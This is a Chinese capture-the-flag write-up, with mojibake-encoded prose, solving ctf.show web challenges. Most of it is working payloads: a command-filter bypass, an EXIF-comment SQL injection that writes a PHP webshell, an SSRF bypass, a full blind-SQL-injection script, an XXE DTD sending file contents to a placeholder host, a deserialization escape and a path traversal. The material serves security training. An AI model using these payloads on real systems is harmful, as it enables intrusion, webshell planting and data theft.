<p>ç©ºæ ¼ç”¨<code>&lt;</code>æˆ–è€…<code>%09</code>ï¼Œè¯»å–ç”¨<code>base64</code>æˆ–è€…<code>ca\t</code>ï¼Œ<code>php</code>æ¢æˆ<code>ph\p</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?get_flag=base64&lt;flag.ph\p</span><br></pre></td></tr></table></figure>

<h2 id="ä½ æ²¡è§è¿‡çš„æ³¨å…¥"><a href="#ä½ æ²¡è§è¿‡çš„æ³¨å…¥" class="headerlink" title="ä½ æ²¡è§è¿‡çš„æ³¨å…¥"></a>ä½ æ²¡è§è¿‡çš„æ³¨å…¥</h2><p>è¿™é¢˜ä¹ŸçœŸå¤ŸæŠ½è±¡çš„ï¼Œç¡®å®æ˜¯æ²¡è§è¿‡ğŸ˜…</p>
<p>å…ˆè¯´ä¸ç”¨æ‰«ï¼Œç»“æœè¿˜æ˜¯è¦è®¿é—®robots.txtï¼Œæ‹¿åˆ°é‡ç½®å¯†ç çš„ç½‘å€<code>/pwdreset.php</code></p>
<p>ç›´æ¥é‡ç½®å¯†ç ï¼Œè¿›å»æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œæ— è¿‡æ»¤</p>
<p>æ–‡ä»¶ä¸Šä¼ åï¼Œåœ¨åç«¯ä¼šè¢«é‡å‘½å+å‹ç¼©å¤„ç†ï¼Œæ— åˆ©ç”¨ç©ºé—´ï¼Œåªæœ‰ä¸ª<code>filetype</code>è¿›è¡Œæç¤º</p>
<p>ä¼ ä¸ªphp-&gt;<code>filetype:PHP script, ASCII text, with CRLF line terminators</code></p>
<p>çœ‹äº†æºç æ‰çŸ¥é“é™åˆ¶äº†10k</p>
<blockquote>
<p>è¿™é‡Œè€ƒçš„æ˜¯<code>EXIF</code>ä¿¡æ¯ä¸­<code>comment</code>å­—æ®µæ³¨å…¥ï¼Œè¿™ä¸ªå­—æ®µä¼šå­˜å…¥æ•°æ®åº“ï¼Œ<code>finfo-&gt;file()</code>å†åœ¨åé¢è¾“å‡ºè¿™ä¸ªä¿¡æ¯ï¼Œé€ æˆäº†sqlæ³¨å…¥æ¼æ´ï¼Œå…ˆå»ç½‘ä¸Šä¸‹è½½ä¸€ä¸ª<code>exiftool</code>å·¥å…· â€”â€”&gt; <a href="https://exiftool.org/">https://exiftool.org/</a></p>
<p>å¯ä»¥ç¼–è¾‘å›¾ç‰‡çš„çš„<code>EXIF</code>ä¿¡æ¯</p>
<p>payloadï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;./exiftool -overwrite_original -comment=<span class="string">&quot;y1ng\&quot;&#x27;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#x27;/var/www/html/1.php&#x27;;#&quot;</span> 1.jpg</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;hex(&lt;?=$_POST[0];)=0x3C3F3D60245F504F53545B305D603B</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ä¸çŸ¥é“å“ªè¯•å‡ºæ¥çš„ä»exifä¿¡æ¯é‡Œæ³¨</p>
<p>uploadæºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		die(&quot;Return Code: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if($_FILES[&quot;file&quot;][&quot;size&quot;]&gt;10*1024)&#123;</span><br><span class="line">		die(&quot;æ–‡ä»¶è¿‡å¤§: &quot; .($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))</span><br><span class="line">      &#123;</span><br><span class="line">      echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; already exists. &quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    else</span><br><span class="line">      &#123;</span><br><span class="line">	  $filename = md5(md5(rand(1,10000))).&quot;.zip&quot;;</span><br><span class="line">	  $filetype = (new finfo)-&gt;file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span><br><span class="line">	  $filepath = &quot;upload/&quot;.$filename;</span><br><span class="line">	  $sql = &quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;.$filename.&quot;&#x27;,&#x27;&quot;.$filepath.&quot;&#x27;,&#x27;&quot;.$filetype.&quot;&#x27;);&quot;;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],</span><br><span class="line">      &quot;upload/&quot; . $filename);</span><br><span class="line">	  $con = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ctf&quot;);</span><br><span class="line">		if (!$con)</span><br><span class="line">		&#123;</span><br><span class="line">			die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">		&#125;</span><br><span class="line">		if (mysqli_multi_query($con, $sql)) &#123;</span><br><span class="line">			header(&quot;location:filelist.php&quot;);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . mysqli_error($con);</span><br><span class="line">		&#125;</span><br><span class="line">		 </span><br><span class="line">		mysqli_close($con);</span><br><span class="line">		</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°å¤ç°ä¸€ä¸‹</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402082343785.png" alt="image-20240208234314671"></p>
<h2 id="ç­¾åˆ°-è§‚å·±"><a href="#ç­¾åˆ°-è§‚å·±" class="headerlink" title="ç­¾åˆ°_è§‚å·±"></a>ç­¾åˆ°_è§‚å·±</h2><p>æ—¥å¿—åŒ…å«</p>
<h2 id="web1-è§‚å­—"><a href="#web1-è§‚å­—" class="headerlink" title="web1_è§‚å­—"></a>web1_è§‚å­—</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#flag in http://192.168.7.68/flag</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = $_GET[&#x27;url&#x27;];</span><br><span class="line">    $protocol = substr($url, 0,7);</span><br><span class="line">    if($protocol!=&#x27;http://&#x27;)&#123;</span><br><span class="line">        die(&#x27;ä»…é™httpåè®®è®¿é—®&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\&#x27;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/&#x27;, $url))&#123;</span><br><span class="line">        die(&#x27;ä»…é™åŸŸååœ°å€è®¿é—®&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    system(&#x27;curl &#x27;.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™åˆ¶æ­»äº†httpåè®®ï¼Œä¸ç»™ç”¨å„ç§ç‰¹æ®Šå­—ç¬¦</p>
<p>æœ¬æ¥æƒ³ç€è‡ªå·±çš„åŸŸåè½¬å‘åˆ°192.168.7.68ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šæœ‰<code>.</code>ï¼Œipè½¬10è¿›åˆ¶æˆ–è€…16è¿›åˆ¶éƒ½ä¼šå‡ºç°0</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402091451474.png" alt="image-20240209145109405"></p>
<p>curlå¯ä»¥ç”¨<code>ã€‚</code>ä»£æ›¿<code>.</code></p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402091452646.png" alt="image-20240209145234588"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://192ã€‚168ã€‚7ã€‚68/flag</span><br></pre></td></tr></table></figure>

<h2 id="web2-è§‚æ˜Ÿ"><a href="#web2-è§‚æ˜Ÿ" class="headerlink" title="web2_è§‚æ˜Ÿ"></a>web2_è§‚æ˜Ÿ</h2><p>fuzzä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;!&#x27;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;=&#x27;, &#x27;`&#x27;, &#x27;|&#x27;, &#x27;~&#x27;, &#x27; &#x27;, &#x27;union&#x27;, &#x27;rand&#x27;, &#x27;ascii&#x27;, &#x27;and&#x27;, &#x27;||&#x27;, &#x27;sleep&#x27;, &#x27;benchmark&#x27;, &#x27;rlike&#x27;, &#x27;like&#x27;]</span><br></pre></td></tr></table></figure>

<p>æ‰çœ‹å‡ºæ¥æ˜¯intç±»å‹ç›²æ³¨ï¼Œå•åŒå¼•å·è¢«banäº†ï¼Œè¡¨åå¯ä»¥ç”¨16è¿›åˆ¶ä»£æ›¿</p>
<p>é€—å·è¢«banç”¨<code>from+for</code>ï¼Œä½†æ˜¯<code>if</code>å°±å½»åº•æ²¡æ³•ç”¨äº†ï¼Œæ‰€ä»¥ç”¨<code>case when [express] then [x] else [y] end</code>ä»£æ›¿</p>
<p><code>ascii</code>ç›´æ¥æ¢ç”¨<code>ord</code></p>
<p>ç›´æ¥è„šæœ¬è·‘ï¼Œä¼°è®¡sqlmapåªä¼šæ›´å¿«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://c11b6d04-1817-4495-a58d-96b02ab819f5.challenge.ctf.show/index.php?id=&quot;</span><br><span class="line">alphabets = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;j&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;g&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;,</span><br><span class="line">             &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;G&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;,</span><br><span class="line">             &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_database_name():</span><br><span class="line">    database = &quot;&quot;</span><br><span class="line">    for i in range(1, 5):</span><br><span class="line">        min = 48</span><br><span class="line">        max = 122</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr(database()/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        database = database + chr(mid)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_table_name():</span><br><span class="line">    table = &quot;&quot;</span><br><span class="line">    for i in range(1, 20):</span><br><span class="line">        min = 48</span><br><span class="line">        max = 122</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/in/**/(database()))/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        table = table + chr(mid)</span><br><span class="line">        print(table)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_column_name():</span><br><span class="line">    column = &quot;&quot;</span><br><span class="line">    for i in range(1, 20):</span><br><span class="line">        min = 48</span><br><span class="line">        max = 122</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/in/**/(0x666c6167))/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        column = column + chr(mid)</span><br><span class="line">        print(column)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_data():</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(1, 50):</span><br><span class="line">        min = 33</span><br><span class="line">        max = 127</span><br><span class="line">        mid = int((min + max) / 2)</span><br><span class="line">        while max &gt;= min:</span><br><span class="line">            payload = f&quot;case/**/when/**/ord(substr((select/**/group_concat(flag)/**/from/**/flag)/**/from/**/&#123;i&#125;/**/for/**/1))&lt;&#123;mid&#125;/**/then/**/1/**/else/**/0/**/end&quot;</span><br><span class="line">            burpurl = url + payload</span><br><span class="line">            re = requests.get(burpurl)</span><br><span class="line">            if &quot;If&quot; in re.text:</span><br><span class="line">                max = mid - 1</span><br><span class="line">            else:</span><br><span class="line">                min = mid + 1</span><br><span class="line">            mid = int((min + max) / 2)</span><br><span class="line">        flag = flag + chr(mid)</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># get_database_name()</span><br><span class="line"># get_table_name()</span><br><span class="line"># get_column_name()</span><br><span class="line">get_data()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web3-è§‚å›¾"><a href="#web3-è§‚å›¾" class="headerlink" title="web3_è§‚å›¾"></a>web3_è§‚å›¾</h2><p>è·³è½¬<code>showImage.php</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//$key = substr(md5(&#x27;ctfshow&#x27;.rand()),3,8);</span><br><span class="line">//flag in config.php</span><br><span class="line">include(&#x27;config.php&#x27;);</span><br><span class="line">if(isset($_GET[&#x27;image&#x27;]))&#123;</span><br><span class="line">    $image=$_GET[&#x27;image&#x27;];</span><br><span class="line">    $str = openssl_decrypt($image, &#x27;bf-ecb&#x27;, $key);</span><br><span class="line">    if(file_exists($str))&#123;</span><br><span class="line">        header(&#x27;content-type:image/gif&#x27;);</span><br><span class="line">        echo file_get_contents($str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨éšæœºç”Ÿæˆçš„<code>key</code>è§£å¯†<code>image</code>ï¼Œä¸€æ®µèƒ½è¢«æ­£ç¡®è§£æçš„å¯†æ–‡ä¸º<code>Z6Ilu83MIDw=</code>ï¼Œåªè¦çŒœå‡ºåŸæ–‡æ˜¯ä»€ä¹ˆï¼Œå°±å¯ä»¥é€šè¿‡ç¢°æ’å‡º<code>key</code>ï¼Œç„¶åä½¿ç”¨<code>encrypt</code>è¿›è¡Œè¯»å–äº†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$r = 0;</span><br><span class="line">while (True)&#123;</span><br><span class="line">    while (ob_get_level()) &#123;</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line">    $t = rand();</span><br><span class="line">    if ($r&lt;$t)&#123;</span><br><span class="line">        $r = $t;</span><br><span class="line">        echo $t.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//ç»è¿‡ç¢°æ’å¤§æ¦‚å¯ä»¥çŸ¥é“randçš„èŒƒå›´ä¸º0-2147483647(æ¢…æ£®ç´ æ•°)</span><br></pre></td></tr></table></figure>

<p>å†™ä¸ªåŠ å¯†ç¢°æ’è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$pass = &quot;Z6Ilu83MIDw=&quot;;</span><br><span class="line">for ($i=0;$i&lt;=2147483647;$i++)&#123;</span><br><span class="line">    while (ob_get_level()) &#123;</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line">    $key = substr(md5(&#x27;ctfshow&#x27;.$i),3,8);</span><br><span class="line">    if (preg_match(&#x27;/jpg|gif|png/&#x27;,(openssl_decrypt($pass, &#x27;bf-ecb&#x27;, $key))))&#123;</span><br><span class="line">        echo $i.$key.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//ç¢°å‡ºæ¥27347</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$file = &quot;config.php&quot;;</span><br><span class="line">$key = substr(md5(&#x27;ctfshow&#x27;.&quot;27347&quot;),3,8);</span><br><span class="line">echo openssl_encrypt($file, &#x27;bf-ecb&#x27;, $key);</span><br></pre></td></tr></table></figure>

<h2 id="web4-è§‚å¿ƒ"><a href="#web4-è§‚å¿ƒ" class="headerlink" title="web4_è§‚å¿ƒ"></a>web4_è§‚å¿ƒ</h2><p>ç‚¹å‡»<code>å åœ</code>è®¿é—®<code>api.php</code>ï¼Œçœ‹ä¸€çœ¼è´Ÿè½½ä¸€çœ¼xxe</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402151804476.png" alt="image-20240215180430368">*</p>
<p><a href="https://xz.aliyun.com/t/3357">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a></p>
<p><a href="https://www.freebuf.com/articles/web/177979.html">XXEæ¼æ´åˆ©ç”¨æŠ€å·§ï¼šä»XMLåˆ°è¿œç¨‹ä»£ç æ‰§è¡Œ</a></p>
<p>test.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe &quot;&lt;!ENTITY &amp;#37; xxe SYSTEM &#x27;http://ip/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>evil.xml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">&lt;test&gt;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥è°ƒç”¨xmlå°±è¡Œ</p>
<p>è¿™é¢˜ä¸çŸ¥é“ä»€ä¹ˆåŸå› ï¼Œåœ¨è¿œç¨‹è°ƒç”¨<code>&lt;!ENTITY &amp;#37; xxe SYSTEM &#39;http://ip/%file;&#39;&gt;</code>æ²¡æœ‰å®é™…è®¿é—®å‡ºæ¥ï¼Œå¯¼è‡´åœ¨è¿œç¨‹æ²¡æ³•è¯»å‡ºæ¥ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨<code>file:///flag.txt</code>è¯»åˆ°çš„æ¢è¡Œç¬¦é€ æˆ<code>loadXML()</code>æŠ¥é”™å›æ˜¾</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402151956352.png" alt="image-20240215195634279"></p>
<p><a href="https://security.stackexchange.com/questions/234655/php-blind-xxe-exploitation-invalid-uri-in-entity">å‚è€ƒ</a></p>
<p>å¦‚æœä½¿ç”¨base64åçš„ç»“æœï¼Œä¸ä¼šæŠ¥é”™ï¼Œä½†åŒæ—¶å¹¶æ²¡æœ‰è¯·æ±‚å‡ºæ¥</p>
<h2 id="web1-æ­¤å¤œåœ†"><a href="#web1-æ­¤å¤œåœ†" class="headerlink" title="web1_æ­¤å¤œåœ†"></a>web1_æ­¤å¤œåœ†</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">	public $uname;</span><br><span class="line">	public $password;</span><br><span class="line">	public function __construct($uname,$password)</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;uname=$uname;</span><br><span class="line">		$this-&gt;password=$password;</span><br><span class="line">	&#125;</span><br><span class="line">	public function __wakeup()</span><br><span class="line">	&#123;</span><br><span class="line">			if($this-&gt;password===&#x27;yu22x&#x27;)</span><br><span class="line">			&#123;</span><br><span class="line">				include(&#x27;flag.php&#x27;);</span><br><span class="line">				echo $flag;	</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				echo &#x27;wrong password&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[1];</span><br><span class="line">$password=1;</span><br><span class="line">$ser=filter(serialize(new a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br></pre></td></tr></table></figure>

<p>ä¸€çœ¼ä¸çœŸï¼Œå˜é•¿åº¦ååºåˆ—åŒ–ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web2-æ•…äººå¿ƒ"><a href="#web2-æ•…äººå¿ƒ" class="headerlink" title="web2_æ•…äººå¿ƒ"></a>web2_æ•…äººå¿ƒ</h2><p>hint</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#x27;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">$url[1]=$_POST[&#x27;url&#x27;];</span><br><span class="line">if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</span><br><span class="line">    $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</span><br><span class="line">    if($d)&#123;</span><br><span class="line">             highlight_file(&#x27;hint.php&#x27;);</span><br><span class="line">             if(filter_var($url[1],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                $host=parse_url($url[1]);</span><br><span class="line">                print_r($host); </span><br><span class="line">                if(preg_match(&#x27;/ctfshow\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123;</span><br><span class="line">                    print_r(file_get_contents($url[1]));</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo &#x27;å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &#x27;please give me url!!!&#x27;;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;æƒ³ä¸€æƒ³md5ç¢°æ’åŸç†å§?!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¦æ±‚<code>$a</code>æ˜¯æ•°å­—ï¼Œé•¿åº¦å°äº7ï¼Œéé›¶ä¸”å¹³æ–¹è¿ç®—ç­‰äºé›¶</p>
<p>å¯ä»¥çŒœæµ‹å¤§æ¦‚æ˜¯ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥æ‰“</p>
<p><a href="https://stackoverflow.com/questions/19779806/minimum-evaluatable-scientific-value">Minimum evaluatable scientific value?</a></p>
<p>ç”±äºphpä¸­åŒç²¾åº¦å­˜å‚¨çš„é™åˆ¶ï¼Œ<code>1E-323</code>ä¼šä»¥<code>float(9.8813129168249E-323)</code>çš„å½¢å¼å­˜å‚¨ï¼Œå½“ä¸‹æ¢ä¸€ä½åˆ°<code>1E-324</code>æ—¶ï¼Œç²¾åº¦ä¸æ»¡è¶³å°±åˆ°äº†<code>float(0)</code></p>
<p>æ‰€ä»¥åªè¦ä»¤<code>$a=1E-162</code>å³å¯</p>
<p>md2æ³¨æ„åˆ°hintå†…å®¹ï¼Œè”æƒ³åˆ°md5çš„å¼±ç±»å‹æ¯”è¾ƒï¼Œè‚¯å®šæ˜¯è¦<code>0exxxxx == 0exxxx</code>çš„ç±»å‹</p>
<p>è¿™ä¸ªhintç»™çš„ä¹ŸğŸ’©ï¼Œå®é™…ä¸Šåº”è¯¥æ˜¯è¿™æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$b = xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">$c = xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$c))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Hash import MD2</span><br><span class="line"></span><br><span class="line">b = &quot;024452&quot;</span><br><span class="line">c = &quot;48399&quot;</span><br><span class="line">num = &quot;0123456789&quot;</span><br><span class="line">for i in num:</span><br><span class="line">    for j in num:</span><br><span class="line">        for k in num:</span><br><span class="line">            for q in num:</span><br><span class="line">                payload2 = &quot;0e&quot; + i + j + k + q + c</span><br><span class="line">                md2_hash_2 = MD2.new(payload2.encode()).hexdigest()</span><br><span class="line">                md2_hash_3 = MD2.new(md2_hash_2.encode()).hexdigest()</span><br><span class="line">                if md2_hash_3[:2] == &#x27;0e&#x27; and md2_hash_3[2:].isdigit():</span><br><span class="line">                    print(&quot;2:&quot; + payload2)</span><br><span class="line">            payload1 = &quot;0e&quot; + i + j + k + b</span><br><span class="line">            md2_hash_1 = MD2.new(payload1.encode()).hexdigest()</span><br><span class="line">            if md2_hash_1[:2] == &#x27;0e&#x27; and md2_hash_1[2:].isdigit():</span><br><span class="line">                print(&quot;1:&quot; + payload1)</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">2:0e603448399</span><br><span class="line">1:0e652024452</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰æ­¥æç¤º<code>flag in /fl0g.txt</code>ï¼Œè¦æ±‚ä¼ å…¥èƒ½è¿‡URLç­›é€‰å™¨çš„å­—ç¬¦</p>
<p><code>file_get_contents</code>æœ‰ä¸ªç‚¹å°±æ˜¯ï¼Œå½“ä¼ å…¥çš„ä¼ªåè®®å¤´æœªçŸ¥æ—¶ï¼Œå½“åšæ–‡ä»¶å¤¹æ“ä½œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=httpt://ctfshow.com/../../../../../../../../fl0g.txt</span><br><span class="line">httpå˜ä¸ºhttptè¿™ä¸ªæœªçŸ¥åè®®</span><br></pre></td></tr></table></figure>

